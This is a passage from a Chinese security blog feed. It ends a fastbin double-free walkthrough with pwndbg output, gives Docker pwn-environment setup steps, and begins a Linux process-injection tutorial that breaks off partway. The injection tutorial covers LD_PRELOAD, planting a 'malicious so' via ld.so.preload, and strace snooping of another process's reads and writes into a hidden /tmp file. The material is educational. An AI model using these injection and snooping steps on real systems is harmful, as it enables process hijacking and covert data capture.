class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x603020 ◂— <span class="hljs-number">0</span>x603000<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到这个时候我们已经有了一个free的回环链</p><p>程序继续运行,d已经赋完了值,我们可以看到他的fb指针已经是stack_var的地址了</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x603010</span>:       <span class="hljs-number">0</span>x00007fffffffe5f8      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x603030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000603000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br></code></pre></td></tr></table></figure><p>这个时候我们看看bins</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x603010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure><p>可以看到free list中已经有了栈指针,那么这个时候我们再分配就可以分配到栈的内存空间了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x7fffffffe5f8</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x603020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x603000</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x603040</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fa1</span><br>&#125;<br><span class="hljs-number">0x603060</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135073</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>程序先在栈上定义了一个变量stack_var</p><p>之后malloc了三个chunk a,b,c</p><p>之后做了一个double free,形成了一个a-&gt;b-&gt;a的free链</p><p>此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a</p><p>之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了</p><p>此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake chunk,形成了一个新的free链</p><p>最后再申请内存的时候,我们就取出了栈上的内存</p><p>如上</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197437">https://www.anquanke.com/post/id/197437</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwning is an art</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn环境docker化</title>
    <link href="/2020/01/07/pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96/"/>
    <url>/2020/01/07/pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<blockquote><p>新年第一篇水文,因为有些时候做一些相对简单的题目时打开虚拟机这么庞大的东西显得不是很明智,还有就是在一场比赛中遇到不同版本的pwn题时如果切换虚拟机也十分的麻烦,因此将Pwn环境搭建在docker下就十分的方便,本文简单记录下在centos7上利用ubuntu18.04镜像搭建pwn环境的方法</p></blockquote><h1 id="0x00-参考文章"><a href="#0x00-参考文章" class="headerlink" title="0x00 参考文章"></a>0x00 参考文章</h1><p>别的不说了,参考文章先贴上</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//www.jianshu.com/p/ea<span class="hljs-number">4</span>a<span class="hljs-number">00</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">21</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol">https:</span>//developer.aliyun.com/mirror/ubuntu?spm<span class="hljs-operator">=</span>a<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>h.<span class="hljs-number">13651102.0</span>.<span class="hljs-number">0.53322</span>f<span class="hljs-number">70</span>tlgkLD<br><span class="hljs-symbol">https:</span>//help.aliyun.com/document_detail/<span class="hljs-number">51810</span>.html<br><span class="hljs-symbol">https:</span>//e<span class="hljs-number">3</span>pem.github.io/<span class="hljs-number">2019</span>/<span class="hljs-number">04</span>/<span class="hljs-number">19</span>/<span class="hljs-variable">%E6</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%82</span><span class="hljs-variable">%E9</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%B9</span>/<span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%A8docker</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%90</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%BApwn</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%8</span>E<span class="hljs-variable">%AF</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%83</span>/<br><span class="hljs-symbol">https:</span>//xiaoxiaorenwu.top/<span class="hljs-number">2019</span>/<span class="hljs-number">08</span>/<span class="hljs-number">08</span>/docker<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%E8</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%86</span>/#more<br></code></pre></td></tr></table></figure><h1 id="0x01-拉取镜像-运行docker"><a href="#0x01-拉取镜像-运行docker" class="headerlink" title="0x01 拉取镜像,运行docker"></a>0x01 拉取镜像,运行docker</h1><p>这里就不详细说明docker的安装了,我们直接拉取镜像吧</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">$ docker pull ubuntu:18.04<br><span class="hljs-section">18.04: Pulling from library/ubuntu</span><br><span class="hljs-section">2746a4a261c9: Pull complete</span><br><span class="hljs-section">4c1d20cdee96: Pull complete</span><br><span class="hljs-section">0d3160e1d0de: Pull complete</span><br><span class="hljs-section">c8e37668deea: Pull complete</span><br><span class="hljs-section">Digest: sha256:250cc6f3f3ffc5cdaa9d8f4946ac79821aafb4d3afc93928f0de9336eba21aa4</span><br><span class="hljs-section">Status: Downloaded newer image for ubuntu:18.04</span><br><span class="hljs-section">docker.io/library/ubuntu:18.04</span><br></code></pre></td></tr></table></figure><p>好啦,到这里就拉取完毕,我们可以查看下当前的镜像</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>docker images<br>ubuntu                        <span class="hljs-number">18.04</span>               <span class="hljs-number">549</span>b9b86cb8d        <span class="hljs-number">2</span> weeks ago         <span class="hljs-number">64.2</span>MB<br></code></pre></td></tr></table></figure><p>然后我们启动刚刚下载的镜像,这里我们采用-i参数(打开STDIN，用于控制台交互 )和-t参数(分配tty设备，该可以支持终端登录，默认为false),然后用–name参数起一个花名</p><p><em>这里要注意的就是我们正常使用的时候启动时需要添加–privileged参数来获取调试程序的权限,不然是没有办法使用gdb的</em></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>docker run -i -t --name pwn_2.<span class="hljs-number">27</span> <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">18.04</span> bash<br>root<span class="hljs-variable">@f760e5435e30</span><span class="hljs-symbol">:/</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><ul><li><p>拿到一个新系统第一件事自然是换镜像!!</p><p>  首先我们update一下,然后下载我们最爱的vim,之后修改下载源即可</p><p>  当然也就是修改&#x2F;etc&#x2F;apt&#x2F;sources.list的内容,我们将其中的<a href="http://archive.ubuntu.com/">http://archive.ubuntu.com</a> 改为mirrors.aliyun.com即可,下如18.04</p>  <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial main<br><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main<br><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial universe<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates universe<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates universe<br><br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security universe<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security universe<br></code></pre></td></tr></table></figure><p>  然后就是正常安装流程,这里我安装完Git后直接拉来我的脚本<br> <a href="https://github.com/nightRainy/Pwn_environment_automatically_build_script">pwn environment</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/nightRainy/Pwn_environment_automatically_build_script.git<br><span class="hljs-built_in">cd</span> Pwn_environment_automatically_build_script<br><span class="hljs-built_in">chmod</span> +x setup.sh<br>./setup.sh<br></code></pre></td></tr></table></figure><p> 下面要做的就是一些简单的交互和等待…<br> 之后我们需要设置一些tmux的鼠标切换:)</p> <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@98c01766c4db</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># touch .tmux.conf</span><br>root<span class="hljs-variable">@98c01766c4db</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># echo &#x27;set -g mouse on&#x27; &gt; .tmux.conf</span><br></code></pre></td></tr></table></figure><p> 这里说明一下,我的自动化脚本只安装了<br> gcc,gdb,libc6_dev_i386,pwntools,pwndbg,oh_My_zsh,one_gadget,roputils,tmux几个工具,还有其他需要的工具需要自行下载</p><p> 之后我们退出一下我们的docker,进行下一步</p></li><li><p>打包为镜像并上传</p><p> 首先docker ps 看看我们docker的实例号:</p> <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$ docker ps<br>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<br><span class="hljs-number">98</span><span class="hljs-keyword">c</span><span class="hljs-number">01766</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>db        ubuntu:<span class="hljs-number">18.04</span>        <span class="hljs-string">&quot;bash&quot;</span>              <span class="hljs-number">50</span> minutes ago      Up <span class="hljs-number">50</span> minutes                           pwn_<span class="hljs-number">2.27</span><br><br></code></pre></td></tr></table></figure><p> 之后要做的就是将其打包为镜像</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit -m <span class="hljs-string">&quot;pwn 18.04 2.27&quot;</span> <span class="hljs-number">98</span>c01766c4db zhihsi/dockerpwn:<span class="hljs-number">2</span>.<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p> <strong>请将zhihsi换为自己的dockerhub账号名,其中-m后面的是镜像的描述,最后的2.27为标签</strong><br> 之后查看一下我们的docker</p> <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">$ docker images<br>REPOSITORY                    <span class="hljs-keyword">TAG</span>                 <span class="hljs-title">IMAGE</span> ID            CREATED             SIZE<br>zhihsi/dockerpwn              <span class="hljs-number">2.27</span>                <span class="hljs-number">0357</span>f4157a83        <span class="hljs-number">13</span> seconds ago      <span class="hljs-number">1.44</span>GB<br></code></pre></td></tr></table></figure><p> 上传到我们的dockerhub上</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> push zhihsi/dockerpwn:<span class="hljs-number">2</span>.<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p> <strong>如果出现denied: requested access to the resource is denied 请检查是否登陆了</strong><br> 如果没有登陆,可以使用docker login登陆一下,然后就可以上传了<br> 然后就出现了一个神奇的问题,上传速度巨慢,下载速度估计23333,后来发现一个师傅的文章,是传到阿里云的docker镜像中</p><p> <a href="https://help.aliyun.com/document_detail/51810.html">基本方法</a></p></li></ul><p>之后我们就可以使用我们的镜像了,运行的时候记得加特权模式:-)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -i -t --privileged zhihsi/dockerpwn:<span class="hljs-number">2</span>.<span class="hljs-number">27</span> bash<br></code></pre></td></tr></table></figure><p>over~</p><hr><p>2021&#x2F;4&#x2F;23日注</p><p>这地方一直是我想改的地方,但是因为懒狗一直没改,想了想还是应该说明白不然会引起误导总是不好的</p><p>上面说到运行镜像的时候需要加特权模式其实也不一定,可以直接赋予调试权限(ptrace),这是由于linux的capbilities安全机制,我们在启动docker的时候docker出于安全考虑是没有给我们调试权限的,因此需要我们自己加上sys_ptrace权限才可以进行调试,而特权模式相当于给予了docker所有的能力</p><p>个人一般喜欢使用特权模式,一个是因为我并不将他映射到主机端口上对外开放使用,权限高自然是最好,另一个就是传文件很方便,随意传到哪个文件夹都可以,至此</p><p>对capbilities机制感兴趣的童鞋们可以自己研究一下,我这里就不多说了,单纯的埋一下坑hh</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux进程注入</title>
    <link href="/2019/11/30/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2019/11/30/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近在开发一些东西的时候遇到了一些比较奇特的需求用到了该姿势,就顺势学习了一波,在一些情景下,我们需要无进程启动一些程序,此时线程注入就非常好用了,此处介绍下linux下的简单线程注入姿势</p></blockquote><h2 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h2><ul><li>无进程运行程序</li><li>动态打补丁(替换函数)</li><li>调试器,逆向软件开发</li><li>程序辅助器?可能dll注入更多些2333</li></ul><h2 id="一般目标"><a href="#一般目标" class="headerlink" title="一般目标"></a>一般目标</h2><ul><li>常驻服务程序</li><li>特定目标文件</li></ul><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul><li>在没有特殊手段的情况下,我们是无法用两个调试器同时调试同一个进程的</li><li>我们只有在拥有对该进程的相应权限的时候才可以注入进程</li></ul><h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><p>我们都知道在windows下我们可以用dll注入来进行线程注入,那么在Linux下,我们也可以用类似dll注入的方法,即共享库so注入来实现功能</p><p>那么我们在linux下该如何进行so注入呢?</p><h3 id="0x00-LD-PRELOAD"><a href="#0x00-LD-PRELOAD" class="headerlink" title="0x00 LD_PRELOAD"></a>0x00 LD_PRELOAD</h3><p>在载入so文件的时候,_init_初始化是先于main函数运行的,因此我们可以通过LD_PRELOAD来载入一个写有_init_的.so库文件<br>例如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//myso.so</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><br><span class="hljs-type">void</span> _init()<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;inject success!\n&quot;</span>);<br>&#125;<br><span class="hljs-comment">/*gcc -fPIC -shared myso.c -c -o myso.o</span><br><span class="hljs-comment">ld -shared -ldl myso.o -o myso.so*/</span><br><br></code></pre></td></tr></table></figure><p>和我们想要注入的程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//test.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is my program!&quot;</span>);<br>&#125;<br><span class="hljs-comment">//gcc test.c -o test</span><br></code></pre></td></tr></table></figure><p>然后我们编译一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc -fPIC -shared myso<span class="hljs-selector-class">.c</span> -c -o myso<span class="hljs-selector-class">.o</span><br>ld -shared -ldl myso<span class="hljs-selector-class">.o</span> -o myso<span class="hljs-selector-class">.so</span><br>gcc test<span class="hljs-selector-class">.c</span> -o test<br></code></pre></td></tr></table></figure><p>之后再运行程序时输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">LD_PRELOAD=./myso.so ./test<br></code></pre></td></tr></table></figure><p>结果:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> ~<span class="hljs-regexp">/inject/</span>Ld : LD_PRELOAD=.<span class="hljs-regexp">/myso.so ./</span>test<br><span class="hljs-keyword">inject</span> success!<br><span class="hljs-keyword">This</span> is my program!<br></code></pre></td></tr></table></figure><p>想要取消也很简单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">unset</span> LD_PRELOAD<br></code></pre></td></tr></table></figure><h3 id="0x01-ld-so-preload"><a href="#0x01-ld-so-preload" class="headerlink" title="0x01 ld.so.preload"></a>0x01 ld.so.preload</h3><p>我们通过篡改预处理文件就可以达到我们想要的效果</p><p>我们将我们的恶意so文件写入ld.so.preload即可</p><h3 id="0x02-strace"><a href="#0x02-strace" class="headerlink" title="0x02 strace"></a>0x02 strace</h3><p>strace常用来跟踪进程执行时的系统调用和所接收的信号,因此我们也可以通过strace来注入进程,举个例子:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">strace -f -p pid -o /tmp/.<span class="hljs-built_in">log</span> -e trace=<span class="hljs-built_in">read</span>,<span class="hljs-built_in">write</span> -s <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><p>这里也解释一下所用到参数的意思<br>-f 指可以追踪进程fork出来的进程<br>-p 指定进程pid号<br>-o 将strace的输出写入指定文件<br>-e trace&#x3D;read,write 跟踪进程读写的系统调用<br>-s 指定输出的字符串的最大长度.默认为32</p><p>关于更多参数,可以到<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/strace.html">strace 跟踪进程中的系统调用处查询</a></p><h3 id="0x2-ptrace"><a href="#0x2-ptrace" class="headerlink" title="0x2 ptrace"></a>0x2 ptrace</h3><p>利用ptrace注入的过程总结一下就是:</p><ol><li>获取内存读写权限</li><li>使用dlopen(<em>libc_dlopen_mode</em>)函数载入so文件</li><li>调用so中的函数</li></ol><h4 id="获取进程内存读写权限"><a href="#获取进程内存读写权限" class="headerlink" title="获取进程内存读写权限"></a>获取进程内存读写权限</h4><p>ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪(我们的注入就是基于这个</p><p>ptrace函数定义如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><br>       <span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-title">ptrace</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> __ptrace_request request, <span class="hljs-type">pid_t</span> pid,</span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-type">void</span> *addr, <span class="hljs-type">void</span> *data)</span></span>;<br></code></pre></td></tr></table></figure><p>其中第一个参数可以选择</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PTRACE_TRACEME</span>,<br><span class="hljs-attribute">PTRACE_ATTACH</span>,<br><span class="hljs-attribute">PTRACE_SEIZE</span>,<br><span class="hljs-attribute">PTRACE_INTERRUPT</span>,<br><span class="hljs-attribute">PTRACE_KILL</span>,<br><span class="hljs-attribute">PTRACE_PEEKTEXT</span>,PTRACE_PEEKDATA<br><span class="hljs-attribute">PTRACE_PEEKUSER</span>     <br><span class="hljs-attribute">PTRACE_POKETEXT</span> ,PTRACE_POKEDATA<br><span class="hljs-attribute">PTRACE_POKEUSER</span><br><span class="hljs-attribute">PTRACE_GETREGS</span>,PTRACE_GETFPREGS, <br><span class="hljs-attribute">PTRACE_SETREGS</span>,PTRACE_SETFPREGS<br><span class="hljs-attribute">PTRACE_SETREGSET</span> (since Linux <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">34</span>)<br><span class="hljs-attribute">PTRACE_GETSIGINFO</span> (since Linux <span 